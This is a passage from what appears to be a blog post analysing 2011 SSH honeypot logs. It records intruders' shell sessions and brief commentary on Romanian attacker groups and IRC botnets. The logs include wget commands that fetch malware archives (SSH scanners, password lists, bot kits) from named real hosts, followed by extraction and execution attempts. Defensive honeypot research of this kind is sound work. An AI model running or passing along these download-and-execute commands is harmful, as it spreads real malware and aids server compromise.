<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">httpd</span><span class="w"></span>
<span class="n">unable</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="ss">&quot;:0&quot;</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">httpd</span><span class="w"></span>
<span class="n">unable</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="ss">&quot;:0&quot;</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="p">..</span><span class="w"></span>
<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cd</span><span class="p">..</span><span class="err">:</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">found</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">..</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">f</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>
<span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="w">    </span><span class="n">gosh</span><span class="p">.</span><span class="n">tgz</span><span class="p">.</span><span class="n">tar</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">gosh</span><span class="p">.</span><span class="n">tgz</span><span class="p">.</span><span class="n">tar93</span><span class="w"></span>
</pre></div>


<h2>Fourth&nbsp;example</h2>
<p>Another attempt. Checking out the website http://eu-ro.ca/ reveals what seems to be a Romanian hacker group/set-up. Peeking in the bot configuration often reveals obscure <span class="caps">IRC</span> channels on Undernet. Following these channels quickly leads you to a whole set-up of channels, bots, and hackers. If you manage to lay low there, you can gain a lot of info (bot commands, group leaders, group set-up, targets and so on), but be prepared for some bans and insults as well. If I had some more spare time, I would set up a few dedicated honeypots (with more advanced shell simulation) and try to uncover&nbsp;more.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">mkdir</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">eu</span><span class="o">-</span><span class="nv">ro</span>.<span class="nv">ca</span><span class="o">/</span>.<span class="nv">kde</span>.<span class="nv">tgz</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">46</span>:<span class="mi">15</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">eu</span><span class="o">-</span><span class="nv">ro</span>.<span class="nv">ca</span><span class="o">/</span>.<span class="nv">kde</span>.<span class="nv">tgz</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">eu</span><span class="o">-</span><span class="nv">ro</span>.<span class="nv">ca</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">1238822</span> <span class="ss">(</span><span class="mi">1</span><span class="nv">M</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">x</span><span class="o">-</span><span class="nv">gzip</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `.<span class="nv">kde</span>.<span class="nv">tgz</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">1</span>,<span class="mi">238</span>,<span class="mi">822</span>    <span class="mi">327</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">0</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">46</span>:<span class="mi">19</span> <span class="ss">(</span><span class="mi">327</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `.<span class="nv">kde</span>.<span class="nv">tgz</span><span class="s1">&#39;</span><span class="s"> saved [1238822/1238822]</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">tar</span> <span class="nv">zxvf</span> .<span class="nv">kde</span>.<span class="nv">tgz</span>
.<span class="nv">kde</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">pass_filees</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">pscan2</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">a1</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">common</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">pass_file</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">ssh</span><span class="o">-</span><span class="nv">scan</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">auto</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">ss</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">go</span>.<span class="nv">sh</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">a</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">sh</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">start</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">vuln</span>.<span class="nv">txt</span>
.<span class="nv">kde</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">pass_filees</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">pscan2</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">a1</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">common</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">pass_file</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">ssh</span><span class="o">-</span><span class="nv">scan</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">auto</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">ss</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">go</span>.<span class="nv">sh</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">a</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">sh</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">start</span>
.<span class="nv">kde</span><span class="o">/</span><span class="nv">vuln</span>.<span class="nv">txt</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">cs</span> .<span class="nv">kde</span>
<span class="nv">bash</span>: <span class="nv">cs</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">cd</span> .<span class="nv">kde</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">kde</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.           ..          <span class="nv">pass_filees</span> <span class="nv">pscan2</span>      <span class="nv">a1</span>          <span class="nv">common</span>
<span class="nv">pass_file</span>   <span class="nv">ssh</span><span class="o">-</span><span class="nv">scan</span>    <span class="nv">auto</span>        <span class="nv">ss</span>          <span class="nv">go</span>.<span class="nv">sh</span>       <span class="nv">a</span>
<span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">sh</span> <span class="nv">start</span>       <span class="nv">vuln</span>.<span class="nv">txt</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">kde</span># <span class="nv">chmod</span> <span class="o">+</span><span class="nv">x</span> <span class="o">*</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">kde</span># .<span class="o">/</span><span class="nv">a</span> <span class="mi">210</span>.<span class="mi">133</span>
<span class="nv">unable</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">display</span> <span class="s2">&quot;</span><span class="s">:0</span><span class="s2">&quot;</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">kde</span># <span class="nv">chmod</span> <span class="o">+</span><span class="nv">x</span> <span class="o">*</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">kde</span># .<span class="o">/</span><span class="nv">start</span> <span class="mi">28</span>
<span class="nv">error</span> <span class="k">while</span> <span class="nv">loading</span> <span class="nv">shared</span> <span class="nv">libraries</span>: <span class="nv">libgnome</span>.<span class="nv">so</span>.<span class="mi">32</span>: <span class="nv">cannot</span> <span class="nv">open</span> <span class="nv">shared</span> <span class="nv">object</span> <span class="nv">file</span>: <span class="nv">No</span> <span class="nv">such</span> <span class="nv">file</span> <span class="nv">or</span> <span class="nv">directory</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">kde</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">ls</span><span class="o">-</span><span class="nv">a</span>
<span class="nv">bash</span>: <span class="nv">ls</span><span class="o">-</span><span class="nv">a</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.        ..       .<span class="nv">kde</span>.<span class="nv">tgz</span> .<span class="nv">kde</span>     .<span class="nv">kde</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">wget</span> <span class="nv">bila</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">bila</span>.<span class="nv">tgz</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">50</span>:<span class="mi">26</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">bila</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">bila</span>.<span class="nv">tgz</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">bila</span>.<span class="k">do</span>.<span class="nv">am</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">262027</span> <span class="ss">(</span><span class="mi">255</span><span class="nv">K</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">octet</span><span class="o">-</span><span class="nv">stream</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">bila</span>.<span class="nv">tgz</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">262</span>,<span class="mi">027</span>      <span class="mi">6</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">42</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">50</span>:<span class="mi">27</span> <span class="ss">(</span><span class="mi">6</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">bila</span>.<span class="nv">tgz</span><span class="s1">&#39;</span><span class="s"> saved [262027/262027]</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">tar</span> <span class="nv">zxvf</span> <span class="nv">bila</span>.<span class="nv">tgz</span>
.<span class="nv">tmp</span>
.<span class="nv">tmp</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">acc</span>
.<span class="nv">tmp</span><span class="o">/</span> <span class="o">-</span><span class="nv">bash</span>
.<span class="nv">tmp</span><span class="o">/</span><span class="nv">s</span>.<span class="nv">sh</span>
.<span class="nv">tmp</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">set</span>
.<span class="nv">tmp</span><span class="o">/</span><span class="nv">pico</span>
.<span class="nv">tmp</span><span class="o">/</span><span class="nv">stealth</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.        ..       .<span class="nv">kde</span>.<span class="nv">tgz</span> .<span class="nv">kde</span>     .<span class="nv">kde</span>     <span class="nv">bila</span>.<span class="nv">tgz</span> .<span class="nv">tmp</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span># <span class="nv">cd</span> .<span class="nv">tmp</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">tmp</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.       ..      <span class="nv">cyc</span>.<span class="nv">acc</span>  <span class="o">-</span><span class="nv">bash</span>  <span class="nv">s</span>.<span class="nv">sh</span>    <span class="nv">cyc</span>.<span class="nv">set</span> <span class="nv">pico</span>    <span class="nv">stealth</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>.<span class="nv">user</span><span class="o">/</span>.<span class="nv">tmp</span># .<span class="o">/</span><span class="nv">stealth</span>
<span class="nv">unable</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">display</span> <span class="s2">&quot;</span><span class="s">:0</span><span class="s2">&quot;</span>
</pre></div>


<h2>Fifth&nbsp;example</h2>
<p>Another straightforward attempt. Also here, the website http://arhiva.do.am seems to be used as a dump for hosting&nbsp;malware.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">dabian</span>.<span class="nv">tgz</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">00</span>:<span class="mi">18</span>:<span class="mi">22</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">dabian</span>.<span class="nv">tgz</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">404</span> <span class="nv">Not</span> <span class="nv">Found</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">arhiva</span>.<span class="nv">tgz</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">00</span>:<span class="mi">18</span>:<span class="mi">57</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">arhiva</span>.<span class="nv">tgz</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">404</span> <span class="nv">Not</span> <span class="nv">Found</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scan</span>.<span class="nv">tar</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">00</span>:<span class="mi">19</span>:<span class="mi">28</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scan</span>.<span class="nv">tar</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">arhiva</span>.<span class="k">do</span>.<span class="nv">am</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">1484800</span> <span class="ss">(</span><span class="mi">1</span><span class="nv">M</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">octet</span><span class="o">-</span><span class="nv">stream</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">scan</span>.<span class="nv">tar</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">1</span>,<span class="mi">484</span>,<span class="mi">800</span>    <span class="mi">518</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">0</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">00</span>:<span class="mi">19</span>:<span class="mi">31</span> <span class="ss">(</span><span class="mi">518</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">scan</span>.<span class="nv">tar</span><span class="s1">&#39;</span><span class="s"> saved [1484800/1484800]</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">tar</span> <span class="nv">xvf</span> <span class="nv">scan</span>.<span class="nv">tar</span>
<span class="nv">scan</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">sshf</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">a6</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">start</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">pass_sh</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">a5</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">sh</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">ssh</span><span class="o">-</span><span class="nv">scan</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">test</span>.<span class="nv">sh</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">README</span>
<span class="nv">scan</span><span class="o">/</span><span class="mi">200</span>.<span class="nv">pscan</span>.<span class="mi">22</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">pass_file</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">sshf0</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">pscan2</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">pico</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">pass_filees</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">vuln</span>.<span class="nv">txt</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">a4</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">a1</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">a2</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">mfu</span>.<span class="nv">txt</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">a</span>
<span class="nv">scan</span><span class="o">/</span><span class="nv">common</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> <span class="nv">scan</span>.<span class="nv">tar</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>   <span class="nv">scan</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="nv">scan</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">scan</span># .<span class="o">/</span><span class="nv">a</span> <span class="mi">64</span>.<span class="mi">189</span>
<span class="nv">Shall</span> <span class="nv">we</span> <span class="nv">play</span> <span class="nv">a</span> <span class="nv">game</span>?
</pre></div>


<h2>Sixth&nbsp;example</h2>
<p>Another attempt. Here, three different malware programs are tried out before giving up. It&#8217;s also interesting to see where intruders hide their downloads, some use <code>/root</code>, some <code>/tmp</code>, some esoteric locations like <code>/tmp/...</code>.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span>
<span class="nv">wget</span>: <span class="nv">missing</span> <span class="nv">URL</span>
<span class="nv">Usage</span>: <span class="nv">wget</span> [<span class="nv">OPTION</span>]... [<span class="nv">URL</span>]...
<span class="nv">Try</span> `<span class="nv">wget</span> <span class="o">--</span><span class="nv">help</span><span class="s1">&#39;</span><span class="s"> for more options.</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">yum</span>
<span class="nv">bash</span>: <span class="nv">yum</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">freewebtown</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">pacalici</span><span class="o">/</span><span class="nv">lib</span>.<span class="nv">tgz</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">09</span> <span class="mi">00</span>:<span class="mi">30</span>:<span class="mi">57</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">freewebtown</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">pacalici</span><span class="o">/</span><span class="nv">lib</span>.<span class="nv">tgz</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">freewebtown</span>.<span class="nv">com</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">8772939</span> <span class="ss">(</span><span class="mi">8</span><span class="nv">M</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">x</span><span class="o">-</span><span class="nv">tar</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">lib</span>.<span class="nv">tgz</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">8</span>,<span class="mi">772</span>,<span class="mi">939</span>    <span class="mi">1844</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">0</span><span class="nv">s</span>


<span class="mi">2011</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">09</span> <span class="mi">00</span>:<span class="mi">31</span>:<span class="mi">02</span> <span class="ss">(</span><span class="mi">1844</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">lib</span>.<span class="nv">tgz</span><span class="s1">&#39;</span><span class="s"> saved [8772939/8772939]</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">tar</span> <span class="nv">zxvf</span> <span class="nv">lib</span>.<span class="nv">tgz</span>
<span class="nv">lib</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">mech</span>.<span class="nv">pid</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">fuck</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">j2</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">v</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">s</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">r</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">__libc_start_main</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">std</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">b</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">bang</span>.<span class="nv">txt</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">j</span>
<span class="nv">lib</span><span class="o">/</span><span class="mi">1</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">f4</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">dir</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">y2kupdate</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">fwd</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">x</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">mech</span>.<span class="nv">set</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">tty</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">cron</span>.<span class="nv">d</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">h</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">sl</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">b2</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">W2Ksp3</span>.<span class="nv">exe</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">tun</span>.<span class="nv">seen</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">f</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">h</span>.<span class="nv">c</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">stream</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">v2</span>
<span class="nv">lib</span><span class="o">/</span><span class="nv">init</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> <span class="nv">lib</span>.<span class="nv">tgz</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="nv">lib</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">lib</span># .<span class="o">/</span><span class="nv">y2kupdate</span>
<span class="nv">unable</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">display</span> <span class="s2">&quot;</span><span class="s">:0</span><span class="s2">&quot;</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">lib</span># .<span class="o">/</span><span class="nv">init</span>
<span class="nv">unable</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">display</span> <span class="s2">&quot;</span><span class="s">:0</span><span class="s2">&quot;</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">lib</span># <span class="nv">cd</span>

